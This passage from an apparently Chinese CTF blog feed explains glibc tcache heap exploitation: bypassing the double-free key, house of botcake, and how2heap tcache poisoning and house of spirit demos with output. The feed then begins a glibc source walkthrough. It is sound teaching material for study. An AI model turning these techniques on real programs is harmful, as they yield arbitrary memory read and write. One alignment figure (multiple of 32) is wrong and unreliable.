SIZE_SZ)</span></span><br></pre></td></tr></table></figure><p>alignof函数就不看了，这里基本上可以看出来chunk的对齐要求是2*SIZE_SZ的倍数，在64位中具体是32的倍数。需要注意的是这里检查的地址是mem的地址而不是chunk的地址。所以在利用的时候，比如劫持chunk的fd进行任意地址读写时，要挑选符合对齐要求的地址。在2.31及之前的glibc版本不需要进行检查。</p><p>检查代码参考：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> stack_var[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">size_t</span>* target = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((<span class="type">long</span>)&amp;stack_var[i] &amp; <span class="number">0xf</span>) == <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">target = &amp;stack_var[i];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">assert(target != <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>地址对齐检查机制是从2.32版本开始的。</p><h3 id="double-free中key的绕过"><a href="#double-free中key的绕过" class="headerlink" title="double free中key的绕过"></a>double free中key的绕过</h3><h4 id="方法一：破坏key"><a href="#方法一：破坏key" class="headerlink" title="方法一：破坏key"></a>方法一：破坏key</h4><p>空闲chunk进入tcache时会被赋予key，从tcache取出时会被置空，以此区分该chunk是否在tcache中。如果程序中存在UAF漏洞或者堆溢出漏洞，我们就可以将key位置置空或者换个数字，这样就可以直接绕过_int_free的第一个if判断，下面的count和对齐检查直接跳过。</p><h4 id="方法二：劫持size"><a href="#方法二：劫持size" class="headerlink" title="方法二：劫持size"></a>方法二：劫持size</h4><p>tcache会根据chunk的size来计算bin索引，而chunk只会在对应的bin内进行比较。如果在第一次释放victim后，利用uaf或者溢出修改victim的size，那么第二次释放的时候_int_free就会去检查修改后的索引对应的bin里有没有victim，从而绕过了检查。</p><h4 id="方法三：利用fastbin"><a href="#方法三：利用fastbin" class="headerlink" title="方法三：利用fastbin"></a>方法三：利用fastbin</h4><p>假如现在我们希望可以double free victim这个内存块，那么我们可以先申请7个和victim一样大的内存块，然后将它们全部释放以填满tcache中对应的那条bin，这时候再释放掉victim就可以使其进入fastbin。<br>这时候申请一个一样大的内存块，因为tcache的优先级大于fastbin，这个chunk会从tcachebin里取，而bin中只有6个chunk且不包含victim，这时可以对victim进行第二次释放就可以使它同时存在于tcachebin和fastbin。<br>其实也可以直接填满tcachebin之后，直接在fastbin里进行double free，因为fastbin只会对链表头部的chunk进行检查，相对比较好绕过，只需要在两次释放中间释放一个无关chunk就行。当然这受限于程序允许我们创建的chunk个数。</p><h4 id="方法四：house-of-botcake"><a href="#方法四：house-of-botcake" class="headerlink" title="方法四：house of botcake"></a>方法四：house of botcake</h4><p>这个方法和上一个方法有点像，但是是利用unsortedbin来实现。fastbin只能存0x80以下大小的chunk，并且想要取出来的话，需要先把tcachebin中的chunk取完才能轮得到fastbin，在一些自定义堆分配的菜单题里不太好用。利用过程如下:</p><ul><li>申请 7 个大小相同，大小大于 0x80 的 chunk，再申请三个，分别为 chunk A 和 chunkB 和 chunk C</li><li>释放前 7 个和 chunk A，前面 7 个都会进入到 tcachebin 里面，chunk A 进入到 unsortedbin</li><li>释放 chunk B，则 chunk B 会和 chunk A 合并</li><li>申请一个与前七个一样大的chunk，空出一个位置来</li><li>再次释放 chunk B，此时 B 同时存在与 unsortedbin 和 tcachebin</li><li>利用时，修改完chunk B的fd指针之后，只需要申请一块稍微比chunk B大一点点的内存，就能把我们想要进行读写操作的地址malloc出来了。</li></ul><h3 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h3><h4 id="tcache-poisoning-from-How2Heap"><a href="#tcache-poisoning-from-How2Heap" class="headerlink" title="tcache poisoning from How2Heap"></a>tcache poisoning from How2Heap</h4><h5 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// disable buffering</span></span><br><span class="line">    <span class="comment">//禁止缓冲区防止打扰到堆布局</span></span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里是为了寻找一个满足对齐要求的地址</span></span><br><span class="line"><span class="type">size_t</span> stack_var[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">size_t</span> *target = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// choose a properly aligned target address</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (((<span class="type">long</span>)&amp;stack_var[i] &amp; <span class="number">0xf</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">target = &amp;stack_var[i];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">assert(target != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, target);</span><br><span class="line">    </span><br><span class="line"><span class="comment">/*从2.32版本开始，tcache引入了一个新的检查机制，申请chunk的时候，如果这个chunk尝试从tcache分配出来，则要检查tcache的counts数组成员在该bin下的大小是否为正数，即规定了assert (tcache-&gt;counts[tc_idx] &gt; 0);所以如果要通过劫持fd构造fake chunk来达到任意地址读写的效果，tcachebin中已有的chunk数量必须符合最后我们要申请chunk的数量*/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line"><span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line"><span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*注意LIFO原则*/</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>,</span><br><span class="line">   <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, target);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// VULNERABILITY</span></span><br><span class="line"><span class="comment">// the following operation assumes the address of b is known, which requires a heap leak</span></span><br><span class="line">    <span class="comment">/*这个地方麻烦一点。从2.32开始引入了fd加密机制，需要用到你要改写的chunk本身的mem地址。在实际利用中我们需要利用uaf等漏洞泄露chunk地址才能正确算出要覆盖的加密fd。*/</span></span><br><span class="line">b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)((<span class="type">long</span>)target ^ (<span class="type">long</span>)b &gt;&gt; <span class="number">12</span>);</span><br><span class="line"><span class="comment">// VULNERABILITY</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, target);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//申请第二块相同大小的chunk后就能从tcachebin中取出我们修改后伪造的chunk了</span></span><br><span class="line"><span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert((<span class="type">long</span>)target == (<span class="type">long</span>)c);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">The</span> address we want <span class="title function_">malloc</span>() to <span class="keyword">return</span> is <span class="number">0x7fffffffddd0</span>.</span><br><span class="line"><span class="title class_">Allocating</span> <span class="number">2</span> buffers.</span><br><span class="line"><span class="title function_">malloc</span>(<span class="number">128</span>): <span class="number">0x5555555592a0</span></span><br><span class="line"><span class="title function_">malloc</span>(<span class="number">128</span>): <span class="number">0x555555559330</span></span><br><span class="line"><span class="title class_">Freeing</span> the buffers...</span><br><span class="line"><span class="title class_">Now</span> the tcache list has [ <span class="number">0x555555559330</span> -&gt; <span class="number">0x5555555592a0</span> ].</span><br><span class="line"><span class="title class_">We</span> overwrite the first <span class="number">8</span> bytes (fd/next pointer) <span class="keyword">of</span> the data at <span class="number">0x555555559330</span></span><br><span class="line">to point to the location to control (<span class="number">0x7fffffffddd0</span>).</span><br><span class="line"><span class="title class_">Now</span> the tcache list has [ <span class="number">0x555555559330</span> -&gt; <span class="number">0x7fffffffddd0</span> ].</span><br><span class="line">1st <span class="title function_">malloc</span>(<span class="number">128</span>): <span class="number">0x555555559330</span></span><br><span class="line"><span class="title class_">Now</span> the tcache list has [ <span class="number">0x7fffffffddd0</span> ].</span><br><span class="line">2nd <span class="title function_">malloc</span>(<span class="number">128</span>): <span class="number">0x7fffffffddd0</span></span><br><span class="line"><span class="title class_">We</span> got the control</span><br></pre></td></tr></table></figure><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>首先申请两个chunk然后释放掉，让其进入tcachebin中。其中size为0x290的堆就是TcacheBin堆头。</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E7%94%B3%E8%AF%B72%E4%B8%AAchunk.png" alt="申请2个chunk"></p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E9%87%8A%E6%94%BE2%E4%B8%AAchunk.png" alt="释放2个chunk"></p><p><img src="https://c-lby.github.io/images/tcache-poisoning/bin%E9%93%BE%E8%A1%A8.png" alt="bin链表"></p><p>从bin链表可以得知，根据tcachebin先进后出的原则，当我们再申请相同大小的chunk的时候，会先分配0x9330的chunk1，再分配0x92a0处的chunk0。这里需要注意一个问题，在heap命令下显示的地址是chunk地址，但是在链表中存的地址是mem地址。</p><p>我们发现每个chunk的fd有点怪，这是因为在高版本有fd加密机制，pwndbg没有解密就直接打印出来了，所以看起来很奇怪。在劫持fd的时候我们也要传入一个加密后的fd，否则会劫持失败。</p><p>下一步就要修改chunk1的fd，这样在申请chunk0的时候我们就可以申请到我们想要到的地方，达成任意地址读写的目的。如果我们修改的是chunk0的fd，那修改的就是堆头的地址，这样会造成堆错误，并且没法利用程序的读写功能达到我们的目的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)((<span class="type">long</span>)target ^ (<span class="type">long</span>)b &gt;&gt; <span class="number">12</span>);</span><br></pre></td></tr></table></figure><p>我们从malloc得到的指针是mem的地址，也就是user_data处，所以指针指向的地址就是储存fd的地方，如果有UAF或者堆溢出漏洞，我们就可以修改chunk的fd。fd加密机制用到了mem地址，所以修改fd的前提是有UAF或者能泄露堆地址。这里有另外一个需要注意的地方，tcachebin链表中的地址是mem地址，所以我们想要读写的地址直接就能写进fd，如果是fastbin，它的链表中的地址是chunk地址，那就需要将target-0x10写进fastbin的fd。</p><p><img src="/images/tcache-poisoning/fd%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84%E9%93%BE%E8%A1%A8.png" alt="fd修改后的链表"></p><p>可以看到链表已经被修改了，接下来申请的第二个chunk就是在栈上的地址了。 </p><h4 id="tcache-house-of-spirit-from-How2Heap"><a href="#tcache-house-of-spirit-from-How2Heap" class="headerlink" title="tcache house of spirit from How2Heap"></a>tcache house of spirit from How2Heap</h4><h5 id="演示代码-1"><a href="#演示代码-1" class="headerlink" title="演示代码"></a>演示代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region这是一个chunk</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Calling <span class="title function_">malloc</span><span class="params">()</span> once so that it sets up its memory.</span><br><span class="line">Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.</span><br><span class="line">This region contains one fake chunk. It&#x27;s size field is placed at 0x7fffffffde08</span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7fffffffde08.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next <span class="built_in">malloc</span> will <span class="keyword">return</span> the region of our fake chunk at 0x7fffffffde08, which will be 0x7fffffffde10!</span><br><span class="line"><span class="title function_">malloc</span><span class="params">(<span class="number">0x30</span>)</span>: 0x7fffffffde10</span><br></pre></td></tr></table></figure><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>这种攻击手段在非堆段的地址伪造了一个chunk，实现了任意地址读写的效果。首先一定要先申请一个chunk以满足对bin中chunk count的检查。然后要修改需要劫持的fake chunk中的size字段。假如我们要修改0x10处的数值，根据chunk的结构不难知道，我们要构造的fake chunk的地址在0x00，那么size字段在0x08处。需要注意的是tcachebin链表中的地址存的是mem地址，所以释放的时候要释放0x10处。注意这个chunk的地址需满足对齐要求。</p><p>size的限制则是不能小于最小size，不能大于最大size（0x410）并且应为0x10的倍数。进入tcachebin时，_int_free不会对PREV_INUSE进行检查，所以size写0x40也行写0x41也行，但是对A和M标志位会检查，如果其值为1时，则会报错invalid pointer。要修改size字段的前提是程序对目标地址本来就能写或者有溢出刚好可以修改size字段，至少要有off by one；如果是要修改堆上地址的话，有uaf也许也能成功劫持。</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/house_of_spirit%E6%A0%87%E5%BF%97%E4%BD%8D%E6%A3%80%E6%9F%A5%E6%8A%A5%E9%94%99.png" alt="house_of_spirit标志位检查报错"></p><p>目标地址伪造前：</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E6%9C%AA%E4%BF%AE%E6%94%B9%E7%9A%84fake_chunk.png" alt="未修改的fake_chunk"></p><p>目标地址修改size：</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E4%BF%AE%E6%94%B9size%E5%90%8E%E7%9A%84fake_chunk.png" alt="修改size后的fake_chunk"></p><p>目标地址被释放后：</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/%E9%87%8A%E6%94%BE%E5%90%8E%E7%9A%84fake_chunk.png" alt="释放后的fake_chunk"></p><p>如果可以成功被释放，说明fake chunk成功绕过检查了。这时候tcachebin中链表就会存有目标地址，下一次申请一个size大小的chunk的时候就可以申请到这一块地址，实现读写。</p><p><img src="https://c-lby.github.io/images/tcache-poisoning/house_of_spirit%E5%8A%AB%E6%8C%81%E6%88%90%E5%8A%9F%E5%90%8E%E7%9A%84bin%E9%93%BE%E8%A1%A8.png" alt="house_of_spirit劫持成功后的bin链表"></p><h4 id="tcache-stashing-unlink-attack-from-How2Heap"><a href="#tcache-stashing-unlink-attack-from-How2Heap" class="headerlink" title="tcache stashing unlink attack from How2Heap"></a>tcache stashing unlink attack from How2Heap</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*To be continued...*/</span></span><br></pre></td></tr></table></figure><p>参考阅读：<br>- <a href="https://jiaweihawk.gitee.io/2021/09/03/tcache%E4%B8%AD%E7%9A%84double-free/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">tcache中的double free</a><br>- <a href="https://www.yuque.com/xswlhhh/ctf/gvg9gbmc0mwsvq6k">xswlhhh爷的博客！</a></p>]]></content>
    
    
    <summary type="html">除非特别说明，默认为glibc_2.35</summary>
    
    
    
    <category term="Heap Exploitation" scheme="https://c-lby.github.io/categories/Heap-Exploitation/"/>
    
    
    <category term="CTF" scheme="https://c-lby.github.io/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.github.io/tags/PWN/"/>
    
    <category term="heap" scheme="https://c-lby.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>『glibc源码补完计划』TcacheBin</title>
    <link href="https://c-lby.github.io/2024/02/14/glibc_tcachebin/"/>
    <id>https://c-lby.github.io/2024/02/14/glibc_tcachebin/</id>
    <published>2024-02-14T10:24:46.000Z</published>
    <updated>2024-03-04T04:33:27.158Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TcacheBin"><a href="#TcacheBin" class="headerlink" title="TcacheBin"></a>TcacheBin</h2><p>tcache全称 thread local caching，TcacheBin是从glibc2.26才开始加入的缓存机制，访问速度比fastbin更快，优先级更高，相对的检查机制也比较弱，容易攻击。</p><h3 id="TcacheBin相关数据结构"><a href="#TcacheBin相关数据结构" class="headerlink" title="TcacheBin相关数据结构"></a>TcacheBin相关数据结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum chunks in tcache bins for tunables.  This value must fit the range</span></span><br><span class="line"><span class="comment">   of tcache-&gt;counts[] entries, else they may overflow.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_COUNT UINT16_MAX</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Process-wide key to try and catch a double-free in the same thread.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> tcache_key;</span><br><span class="line"></span><br><span 